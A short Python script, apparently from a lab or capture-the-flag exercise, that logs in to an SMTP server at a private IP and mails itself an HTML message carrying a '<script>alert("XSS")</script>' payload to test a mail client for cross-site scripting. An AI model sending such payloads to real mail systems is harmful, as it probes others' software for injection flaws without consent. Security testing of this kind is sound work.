import smtplib
 
email_addr = 'user@hack.local'
 
email = 'From: %s\n' % email_addr
email += 'To: %s\n' % email_addr
email += 'Subject: XSS\n'
email += 'Content-type: text/html\n\n'
email += '<script>alert("XSS")</script>'
s = smtplib.SMTP('192.168.58.140', 25)
 
s.login(email_addr, "user")
s.sendmail(email_addr, email_addr, email)
s.quit()
